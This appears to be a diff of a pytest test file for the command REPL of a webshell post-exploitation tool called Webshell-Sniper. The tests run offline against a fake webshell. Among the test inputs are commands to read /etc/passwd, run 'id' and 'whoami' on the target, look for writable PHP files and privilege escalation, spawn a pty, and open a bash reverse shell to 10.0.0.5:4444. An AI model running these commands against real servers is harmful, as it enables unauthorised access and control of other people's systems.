@@ -1,4 +1,8 @@
-"""REPL command dispatch exercised offline with a fake WebShell."""
+"""REPL command dispatch exercised offline with a fake WebShell.
+
+Commands are driven through ``onecmd_plus_hooks`` (the real cmd2 parse path) so
+the namespaced argparse surface is exercised end-to-end.
+"""
 
 import builtins
 
@@ -62,100 +66,142 @@ def repl():
     return Repl([FakeWS()], Config(output_dir="."), session=Session([FakeWS()]))
 
 
-def test_info_commands(repl, capsys):
-    repl.do_p("")
-    repl.do_pv("")
-    repl.do_kv("")
+def run(repl, line):
+    """Drive a line through the full cmd2 parse/dispatch path."""
+    repl.onecmd_plus_hooks(line)
+
+
+def test_recon_info(repl, capsys):
+    run(repl, "recon info")
+    run(repl, "recon php")
+    run(repl, "recon kernel")
     out = capsys.readouterr().out
     assert "8.2.0" in out and "Linux test" in out
 
 
-def test_pwd_and_exec_toggles(repl, capsys):
-    repl.do_setr("")
-    assert repl.local_exec is False
-    repl.do_setl("")
-    assert repl.local_exec is True
-    repl.do_pwd("")
+def test_bare_group_lists_actions(repl, capsys):
+    run(repl, "recon")  # bare group prints its action list
+    out = capsys.readouterr().out
+    assert "privesc" in out and "writable-php" in out
+
+
+def test_prompt_reflects_exec_target(repl):
+    assert "REMOTE" in repl.prompt  # default routes bare input to the target
+    run(repl, "local")
+    assert "LOCAL" in repl.prompt and repl.local_exec is True
+    run(repl, "remote")
+    assert "REMOTE" in repl.prompt and repl.local_exec is False
+
+
+def test_pwd_default(repl, capsys):
+    run(repl, "pwd")
     assert "server default" in capsys.readouterr().out
 
 
-def test_ls_renders_table(repl, capsys):
-    repl.do_ls("/var/www")
+def test_file_ls_renders_table(repl, capsys):
+    run(repl, "file ls /var/www")
     out = capsys.readouterr().out
     assert "a.txt" in out and "name" in out
 
 
-def test_read_and_filemgr_ops(repl, capsys):
-    repl.do_r("/etc/passwd")
-    repl.do_mkdir("/tmp/x")
-    repl.do_chmod("755 /tmp/x")
-    repl.do_mv("/a /b")
-    repl.do_cp("/a /b")
+def test_file_read_and_filemgr_ops(repl, capsys):
+    run(repl, "file read /etc/passwd")
+    run(repl, "file mkdir /tmp/x")
+    run(repl, "file chmod 755 /tmp/x")
+    run(repl, "file mv /a /b")
+    run(repl, "file cp /a /b")
     out = capsys.readouterr().out
     assert "contents-of-/etc/passwd" in out
 
 
-def test_chmod_usage_error(repl, capsys):
-    repl.do_chmod("onlyone")  # wrong arg count
-    assert "usage: chmod" in capsys.readouterr().err  # errors go to stderr
+def test_file_chmod_usage_error(repl, capsys):
+    run(repl, "file chmod onlyone")  # missing the `path` positional
+    err = capsys.readouterr().err
+    assert "chmod" in err and "required" in err
 
 
-def test_exec_and_remote_default(repl, capsys):
-    repl.do_exec("id")
-    repl.do_setr("")
-    repl.default(_stmt("whoami"))
+def test_exec_runs_remote(repl, capsys):
+    run(repl, "exec id")
     out = capsys.readouterr().out
-    assert "ran:id" in out and "ran:whoami" in out
+    assert "ran:id" in out
+
+
+def test_bare_input_defaults_remote(repl, capsys):
+    run(repl, "whoami")  # unrecognised → default() → remote (the new default)
+    out = capsys.readouterr().out
+    assert "ran:whoami" in out
+
+
+def test_local_mode_runs_local(monkeypatch, repl):
+    ran = {}
+    monkeypatch.setattr("subprocess.run", lambda *a, **k: ran.setdefault("cmd", a))
+    run(repl, "local")
+    run(repl, "echo hi")  # default() → local exec
+    assert ran
 
 
 def test_history_records_and_lists(repl, capsys):
-    repl.do_exec("id")
-    repl.do_hist("")
+    run(repl, "exec id")
+    run(repl, "history")
     assert "exec id" in capsys.readouterr().out
 
 
-def test_pty_command(repl, capsys):
-    repl.do_pty("")
+def test_pivot_pty(repl, capsys):
+    run(repl, "pivot pty")
     assert "pty.spawn" in capsys.readouterr().out
+
+
+def test_version(repl, capsys):
+    run(repl, "version")
+    assert "Webshell-Sniper" in capsys.readouterr().out
 
 
 def test_save_writes_session(tmp_path):
     repl = Repl([FakeWS()], Config(output_dir=tmp_path), session=Session([FakeWS()]))
-    repl.do_save("")
+    run(repl, "save")
     assert list(tmp_path.glob("session_*.json"))
 
 
 def test_recon_commands_run(repl):
     # These just need to not raise (they call run_command / disabled_functions).
-    repl.do_fwd("")
-    repl.do_fwpf("")
-    repl.do_gdf("")
+    run(repl, "recon writable")
+    run(repl, "recon writable-php")
+    run(repl, "recon disabled")
 
 
-class _Stmt(str):
-    @property
-    def raw(self):
-        return str(self)
-
-
-def _stmt(s):
-    return _Stmt(s)
-
-
-def test_local_default_executes(monkeypatch, repl, capsys):
-    ran = {}
-    monkeypatch.setattr("subprocess.run", lambda *a, **k: ran.setdefault("cmd", a))
-    repl.do_setl("")
-    repl.default(_stmt("echo hi"))
-    assert ran  # local exec path taken
-
-
-def test_two_arg_usage_error(repl, capsys):
-    repl.do_mv("only-one-arg")
-    assert "usage: mv" in capsys.readouterr().err
-
-
-def test_rm_confirm_abort(monkeypatch, repl, capsys):
+def test_rm_self_delete_confirm_abort(monkeypatch, repl, capsys):
+    monkeypatch.setattr(repl, "_interactive", lambda: True)
     monkeypatch.setattr(builtins, "input", lambda *_: "n")
-    repl.do_rm("")  # no path -> self-delete -> needs confirmation -> aborted
+    run(repl, "file rm")  # no path → self-delete → confirmation → aborted
     assert "Aborted" in capsys.readouterr().out
+
+
+def test_rm_self_delete_refused_noninteractive(repl, capsys):
+    # Not a TTY → must refuse rather than block or destroy access silently.
+    run(repl, "file rm")
+    assert "Refusing" in capsys.readouterr().err
+
+
+def test_pivot_shell_scriptable(monkeypatch, repl, capsys):
+    # Flags supplied inline → runs without prompting (scriptable).
+    calls = {}
+    monkeypatch.setattr(
+        "webshell_sniper.features.revshell.reverse_shell",
+        lambda ws, ip, port, method: calls.setdefault("args", (ip, port, method)),
+    )
+    run(repl, "pivot shell -i 10.0.0.5 -p 4444 -m bash")
+    assert calls["args"] == ("10.0.0.5", 4444, "bash")
+
+
+def test_remote_path_completion_cached(repl):
+    seen = {"n": 0}
+
+    def fake_run(command):
+        seen["n"] += 1
+        return "alpha/\nbeta.txt\ngamma/\n"
+
+    repl.webshells[0].run_command = fake_run
+    first = repl._complete_remote_path("be", "file read be", 10, 12)
+    second = repl._complete_remote_path("be", "file read be", 10, 12)
+    assert first == ["beta.txt"] and second == ["beta.txt"]
+    assert seen["n"] == 1  # second TAB served from the cache
